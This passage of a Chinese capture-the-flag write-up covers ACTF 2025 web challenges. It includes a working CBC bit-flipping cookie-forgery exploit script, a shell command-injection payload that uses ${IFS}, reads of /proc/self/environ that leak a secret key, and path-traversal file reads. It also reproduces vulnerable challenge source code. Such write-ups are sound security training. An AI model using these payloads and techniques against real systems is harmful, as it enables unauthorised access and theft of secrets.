pan></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>cookie 是 CBC 加密的，不知道 key 和 ADMIN_PASSWORD</p>
<p>主要看这个：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">parse_cookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> cookie<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cookie_encrypted <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> validate<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cookie_encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        iv<span class="token punctuation">,</span> padded <span class="token operator">=</span> cookie_encrypted<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cookie_encrypted<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
        decrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>padded<span class="token punctuation">)</span>
        cookie_json_bytes <span class="token operator">=</span> unpad<span class="token punctuation">(</span>decrypted<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        cookie_json <span class="token operator">=</span> cookie_json_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cookie_dict <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>cookie_json<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span> cookie_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>只判断返回的 name</p>
<p>应该是 CBC 字节翻转攻击，参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/246058.html">https://www.freebuf.com/vuls/246058.html</a></p>
<p>本地调试，注册一个账户 admim 进行登录并 parse_cookie，得到要修改的目标 <code>&#123;&quot;name&quot;: &quot;admim&quot;, &quot;password_raw&quot;: &quot;123&quot;, &quot;register_time&quot;: -1&#125;\r\r\r\r\r\r\r\r\r\r\r\r\r</code></p>
<p>然后目的是利用CBC字节翻转修改一个字节，把 m 改成 n</p>
<p>反复调试得到 exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://61.147.171.105:53538"</span>
data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admim"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
token <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'jwbcookie'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
iv <span class="token operator">=</span> token<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
cipher <span class="token operator">=</span> token<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
plaintext <span class="token operator">=</span> <span class="token string">b'&#123;"name": "admim", "password_raw": "123", "register_time": -1&#125;\r\r\r\r\r\r\r\r\r\r\r\r\r'</span>
tmp <span class="token operator">=</span> iv<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>
newIV <span class="token operator">=</span> iv<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> long_to_bytes<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">+</span> iv<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
newtoken <span class="token operator">=</span> newIV <span class="token operator">+</span> cipher
header <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">b"jwbcookie="</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>newtoken<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/home"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>newtoken<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>带上 cookie ，传 ssti rce 即可</p>
<p><img src="/blog/2025/04/26/ACTF-2025/image-20250426150220133.png" alt="image-20250426150220133"></p>
<p>flag：<code>ACTF&#123;n3vEr_imPlem3nT_SuCh_Iv_HIJacK4bl3_C00Kie&#125;</code></p>
<hr>
<h1 id="ACTF-upload"><a href="#ACTF-upload" class="headerlink" title="ACTF upload"></a>ACTF upload</h1><p>随便输个账密登录，上传文件</p>
<p><img src="/blog/2025/04/26/ACTF-2025/image-20250426091042523.png" alt="image-20250426091042523"></p>
<p>发现目录穿越</p>
<p>app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uuid
<span class="token keyword">import</span> os
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> session

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0'</span><span class="token punctuation">:</span>
                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                flash<span class="token punctuation">(</span><span class="token string">'Invalid password'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
        &lt;h1>Login&lt;/h1>
        &lt;h2>No need to register.&lt;/h2>
        &lt;form action="/login" method="post">
            &lt;label for="username">Username:&lt;/label>
            &lt;input type="text" id="username" name="username" required>
            &lt;br>
            &lt;label for="password">Password:&lt;/label>
            &lt;input type="password" id="password" name="password" required>
            &lt;br>
            &lt;input type="submit" value="Login">
        &lt;/form>
        '''</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
        file_path <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'_'</span> <span class="token operator">+</span> f<span class="token punctuation">.</span>filename
        f<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'./uploads/'</span> <span class="token operator">+</span> file_path<span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/upload?file_path=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file_path'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
            &lt;h1>Upload Image&lt;/h1>
            
            &lt;form action="/upload" method="post" enctype="multipart/form-data">
                &lt;input type="file" name="file">
                &lt;input type="submit" value="Upload">
            &lt;/form>
            '''</span>
            
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            file_path <span class="token operator">=</span> <span class="token string">'./uploads/'</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file_path'</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    b64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
                    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'&lt;img src="data:image/png;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>b64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">" alt="Uploaded Image">'</span></span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'base64 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string"> > /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string">.b64'</span></span><span class="token punctuation">)</span>
                <span class="token comment"># with open(f'/tmp/&#123;file_path&#125;.b64', 'r') as f:</span>
                <span class="token comment">#     return f'&lt;img src="data:image/png;base64,&#123;f.read()&#125;" alt="Uploaded Image">'</span>
                <span class="token keyword">return</span> <span class="token string">'Sorry, but you are not allowed to view this image.'</span>
                
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>目的是获取 admin，key是从环境变量读取的</p>
<p>&#x2F;proc&#x2F;self&#x2F;environ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin.<span class="token environment constant">HOSTNAME</span><span class="token operator">=</span>efe59dc58211.<span class="token environment constant">LANG</span><span class="token operator">=</span>C.UTF-8.GPG_KEY<span class="token operator">=</span>E3FF2839C048B25C084DEBE9B26995E310250568.PYTHON_VERSION<span class="token operator">=</span><span class="token number">3.9</span>.17.PYTHON_PIP_VERSION<span class="token operator">=</span><span class="token number">23.0</span>.1.PYTHON_SETUPTOOLS_VERSION<span class="token operator">=</span><span class="token number">58.1</span>.0.PYTHON_GET_PIP_URL<span class="token operator">=</span>https://github.com/pypa/get-pip/raw/0d8570dc44796f4369b652222cf176b3db6ac70e/public/get-pip.py.PYTHON_GET_PIP_SHA256<span class="token operator">=</span>96461deced5c2a487ddc65207ec5a9cffeca0d34e7af7ea1afc470ff0d746207.SECRET_KEY<span class="token operator">=</span>S3cRetK3y.<span class="token environment constant">HOME</span><span class="token operator">=</span>/root.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到<code>SECRET_KEY=S3cRetK3y</code></p>
<p>通过 <a target="_blank" rel="noopener" href="https://md5hashing.net/hash/sha256/32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0">https://md5hashing.net/hash/sha256/32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0</a></p>
<p><code>32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0</code> 解出来是 backdoor</p>
<p>然后对于</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'base64 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string"> > /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string">.b64'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>命令注入即可</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a<span class="token operator">|</span><span class="token function">ls</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>/<span class="token operator">></span>/tmp/1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后用普通用户权限访问 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;1.b64</p>
<p><img src="/blog/2025/04/26/ACTF-2025/image-20250426100258804.png" alt="image-20250426100258804"></p>
<p>于是直接读取 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;Fl4g_is_H3r3 即可</p>
<hr>
<h1 id="not-so-web-2（复现）"><a href="#not-so-web-2（复现）" class="headerlink" title="not so web 2（复现）"></a>not so web 2（复现）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span> json<span class="token punctuation">,</span> time
<span class="token keyword">import</span> os<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> binascii
<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token punctuation">,</span> asdict
<span class="token keyword">from</span> typing <span class="token keyword">import</span> Dict<span class="token punctuation">,</span> Tuple
<span class="token keyword">from</span> secret <span class="token keyword">import</span> KEY<span class="token punctuation">,</span> ADMIN_PASSWORD
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Signature <span class="token keyword">import</span> PKCS1_v1_5
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Hash <span class="token keyword">import</span> SHA256
<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token punctuation">(</span>
    Flask<span class="token punctuation">,</span>
    render_template<span class="token punctuation">,</span>
    render_template_string<span class="token punctuation">,</span>
    request<span class="token punctuation">,</span>
    redirect<span class="token punctuation">,</span>
    url_for<span class="token punctuation">,</span>
    flash<span class="token punctuation">,</span>
    session<span class="token punctuation">,</span>
    abort<span class="token punctuation">,</span>
<span class="token punctuation">)</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> KEY

<span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"/etc/ssl/nginx/local.key"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    private_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/ssl/nginx/local.key"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    private_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>

public_key <span class="token operator">=</span> private_key<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@dataclass</span>
<span class="token keyword">class</span> <span class="token class-name">APPUser</span><span class="token punctuation">:</span>
    name<span class="token punctuation">:</span> <span class="token builtin">str</span>
    password_raw<span class="token punctuation">:</span> <span class="token builtin">str</span>
    register_time<span class="token punctuation">:</span> <span class="token builtin">int</span>


<span class="token comment">#  In-memory store for user registration</span>
users<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> APPUser<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"admin"</span><span class="token punctuation">:</span> APPUser<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> password_raw<span class="token operator">=</span>ADMIN_PASSWORD<span class="token punctuation">,</span> register_time<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">def</span> <span class="token function">validate_cookie</span><span class="token punctuation">(</span>cookie_b64<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    valid<span class="token punctuation">,</span> _ <span class="token operator">=</span> parse_cookie<span class="token punctuation">(</span>cookie_b64<span class="token punctuation">)</span>
    <span class="token keyword">return</span> valid


<span class="token keyword">def</span> <span class="token function">parse_cookie</span><span class="token punctuation">(</span>cookie_b64<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> cookie_b64<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cookie <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie_b64<span class="token punctuation">,</span> validate<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        msg_str<span class="token punctuation">,</span> sig_hex <span class="token operator">=</span> cookie<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>

    msg_dict <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>msg_str<span class="token punctuation">)</span>
    msg_str_bytes <span class="token operator">=</span> msg_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    msg_hash <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>msg_str_bytes<span class="token punctuation">)</span>
    sig <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>sig_hex<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>msg_hash<span class="token punctuation">,</span> sig<span class="token punctuation">)</span>
        valid <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        valid <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> valid<span class="token punctuation">,</span> msg_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user_name"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">generate_cookie</span><span class="token punctuation">(</span>user<span class="token punctuation">:</span> APPUser<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    msg_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"user_name"</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"login_time"</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    msg_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>msg_dict<span class="token punctuation">)</span>
    msg_str_bytes <span class="token operator">=</span> msg_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
